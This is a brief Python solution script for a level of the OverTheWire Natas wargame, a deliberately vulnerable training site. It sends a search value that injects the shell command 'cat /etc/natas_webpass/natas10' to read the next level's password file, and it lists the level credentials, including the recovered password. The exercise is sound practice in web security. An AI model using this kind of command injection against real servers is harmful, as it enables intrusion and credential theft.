import requests,re
import  base64

username="natas9"
password="W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url=str("http://%s.natas.labs.overthewire.org" %username)


r=requests.post(url,auth=(username,password),data={'needle':';cat /etc/natas_webpass/natas10;','submit':'submit'})
print(r.text)
#The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

